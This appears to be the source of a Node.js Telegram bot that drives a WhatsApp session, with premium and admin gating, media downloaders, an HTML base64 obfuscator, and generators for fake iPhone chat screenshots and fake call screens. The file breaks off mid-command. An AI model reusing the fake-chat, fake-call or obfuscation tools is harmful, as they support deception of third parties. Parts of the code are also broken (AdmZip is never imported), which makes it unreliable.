//Base By @Luctadvorisme 
'use strict';
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const sessions = new Map();
const fs = require('fs'); 
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
const axios = require("axios");
const chalk = require('chalk');
const crypto = require('crypto');

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/dbmolo/debe/refs/heads/main/tokens.json";
const STEMPEL = "[MOROSEWAVE]";

const hashWith = alg => s => crypto.createHash(alg).update(s, "utf8").digest("hex");
const md5 = hashWith("md5");
const sha256 = hashWith("sha256");

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL, { timeout: 8000 });
    return response.data.tokens || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
    try {
        console.log(chalk.blue(`${STEMPEL}🔍 Memeriksa apakah token terdaftar...`));
        const validTokens = await fetchValidTokens();
        
        const idBot = tokenBot.split(":")[0];
        const idBotHashes = sha256(md5(idBot));

        if (!validTokens.includes(idBotHashes)) {
            console.log(chalk.red(`${STEMPEL}❌ Token tidak valid! Pasti penyusup anj wkwkwk.`));
            
            process.exit(1); 
            return false;
        }

        console.log(chalk.green(`${STEMPEL}# Token aman lanjut aja,gw pantau`));

        startSesi();

    } catch (err) {
        console.log(chalk.red(`❌ Gagal memvalidasi token: ${err.message}`));
        process.exit(1);
    }
}

validateToken();

let secureMode = false;
function activateSecureMode() { secureMode = true; }

function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let errorData = '';
          res.on('data', c => errorData += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}: ${errorData}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const moment = require('moment-timezone');
const EventEmitter = require('events');

module.exports = { sessions };

const makeInMemoryStore = ({ logger = console } = {}) => {
  const ev = new EventEmitter();

  let chats = {};
  let messages = {};
  let contacts = {};

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid;
      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(msg);

      if (messages[chatId].length > 50) {
        messages[chatId].shift();
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      };
    }
  });

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat;
    }
  });

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id];
    }
  });

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m));
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c));
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c));
    },
    logger
  };
};

const thumbnailUrl = "https://l.top4top.io/p_391703ozu1.jpg";
const thumbnailUrl2 = "https://k.top4top.io/p_3917dr2fk1.jpg";
const thumbnailVideo = "https://j.top4top.io/m_39175h7a11.mp4";

function createSafeSock(sock) {
  let sendCount = 0;
  const MAX_SENDS = 500;
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
      const jid = normalize(target);
      return await sock.sendMessage(jid, message);
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
      const jid = normalize(target);
      return await sock.relayMessage(jid, messageObj, opts);
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)); } catch(e) {}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)); } catch(e) {}
    }
  };
}

function showBanner() {
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @Luctadvorisme 
  Developer 2: @kohxzy
  Version: 32.0.0
  Status: Bot Connected
  `));
}

showBanner();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const bot = new Telegraf(tokenBot);

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
let pollData = null;
let pollKey = null;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const dbPath = "./database/ControlCommand.json";

function loadDB() {
if (!fs.existsSync(dbPath)) return {}
return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
}

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃ STATUS BOT : CONNECTED
⬡═―—―――――――――――――――――—═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡</code></pre>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  let cmd = text.split(" ")[0].toLowerCase();

  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }

  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "MOROWAVE");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⟡━⟢ MoroseWave ⟣━⟡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⟡━⟢ MoroseWave ⟣━⟡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);
let adminList = adminUsers;

const isAdmin = (userId) => {
    return adminUsers.includes(userId.toString());
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

const addAdmin = (userId) => {
    userId = userId.toString();
    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveJSON(adminFile, adminUsers);
    }
};

const removeAdmin = (userId) => {
    userId = userId.toString();
    const before = adminUsers.length;
    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);
    return adminUsers.length < before;
};

const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

const adminPolls = {};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /addadmin\n2. /addadmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    addAdmin(userId);
    
    await ctx.reply(
        `👑 <b>Admin Berhasil Ditambahkan</b>\n• User: <code>${userId}</code>`,
        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
    );
    
    try {
        await ctx.telegram.sendMessage(
            userId,
            `🎖️ <b>Anda sekarang Admin MoroseWave!</b>\nAkses: Semua command bot kecuali manage admin`,
            { parse_mode: "HTML" }
        );
    } catch (error) {}
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /deladmin\n2. /deladmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    if (userId === ownerID.toString()) {
        return ctx.reply("❌ ☇ Tidak bisa hapus owner");
    }
    
    const wasAdmin = removeAdmin(userId);

    if (wasAdmin) {
        await ctx.reply(`🗑️ <b>Admin Berhasil Dihapus</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    } else {
        await ctx.reply(`❌ <b>User bukan admin</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    }
});

bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("enchtml", async (ctx) => {
  if (!ctx.message.reply_to_message?.document) {
    return ctx.reply("❌ Please reply to a .html file you want to encrypt");
  }

  try {
    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileInfo = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${tokenBot}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>MoroseWave</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "enchtmlbymorosewave.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await ctx.replyWithDocument({ source: outputPath }, {
      caption: "✅ Enc Html By MoroseWave ( 🌊 )",
    });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error saat membuat file terenkripsi.");
  }
});

const iqcSessions = {}
bot.command("iqc", async (ctx) => {
  const chatId = ctx.chat.id

  try {
    const args = ctx.message.text.split(" ").slice(1)

    if (args.length < 3) {
      return ctx.reply(
        "❌ Format : `/iqc 12:00 100 Your Message`",
        { parse_mode: "Markdown" }
      )
    }

    const time = args[0]
    const battery = args[1]
    const message = args.slice(2).join(" ")

    iqcSessions[chatId] = { time, battery, message }

    await ctx.reply("Pilih Provider", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Axis", callback_data: "iqc_provider_Axis" },
            { text: "Telkomsel", callback_data: "iqc_provider_Telkomsel" }
          ],
          [
            { text: "IM3", callback_data: "iqc_provider_IM3" }
          ]
        ]
      }
    })
  } catch (err) {
    console.error("ERROR /iqc:", err)
    ctx.reply("Terjadi kesalahan.")
  }
})

bot.action(/^iqc_provider_/, async (ctx) => {
  const chatId = ctx.chat.id

  try {
    const provider = ctx.callbackQuery.data.replace("iqc_provider_", "")
    const data = iqcSessions[chatId]

    if (!data) {
      return ctx.answerCbQuery("Session habis, kirim ulang /iqc", {
        show_alert: true
      })
    }

    const { time, battery, message } = data

    await ctx.answerCbQuery("Diproses...")
    await ctx.reply("Sedang membuat gambar...")

    const apiUrl =
      "https://sockcode.zone.id/api/iqc" +
      `?t=${encodeURIComponent(time)}` +
      `&b=${encodeURIComponent(battery)}` +
      `&m=${encodeURIComponent(message)}` +
      `&p=${encodeURIComponent(provider)}`

    await ctx.replyWithPhoto(apiUrl, {
      caption: "✅ iqc By MoroseWave ( 🕷️ )",
      parse_mode: "Markdown"
    })

    delete iqcSessions[chatId]
  } catch (err) {
    console.error("ERROR callback:", err)
    ctx.reply("Gagal generate gambar.")
  }
})

bot.command("play", async (ctx) => {
   const text = ctx.message.text.split(" ").slice(1).join(" ")

   if (!text) {
      return ctx.reply("[$] Example: /play Payung Teduh")
   }

   try {
      await ctx.reply("⏳ Sedang mencari lagu di Spotify...")

      const { data } = await axios.get(`https://api.nexray.web.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`)

      if (!data.status) {
         return ctx.reply("❌ Lagu tidak ditemukan!")
      }

      const res = data.result

      let caption = `❏ *SPOTIFY - PLAY* ❏

🏷 *Title:* ${res.title}
👤 *Artist:* ${res.artist}
🎧 *Album:* ${res.album}
⏳ *Duration:* ${res.duration}
🎬 *Popularity:* ${res.popularity}
🎉 *Release:* ${res.release_at}
📎 *URL:* ${res.url}`

      await ctx.replyWithPhoto(
         { url: res.thumbnail },
         { caption: caption, parse_mode: "Markdown" }
      )

      await ctx.replyWithAudio(
         { url: res.download_url },
         {
            title: res.title,
            performer: res.artist
         }
      )

   } catch (err) {
      console.log(err)
      ctx.reply("❌ Terjadi kesalahan saat mengambil data.")
   }
});

bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });

bot.command("fixcode", async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`📂 Kirim file .js dan reply dengan perintah /fixcode`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js bre!");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

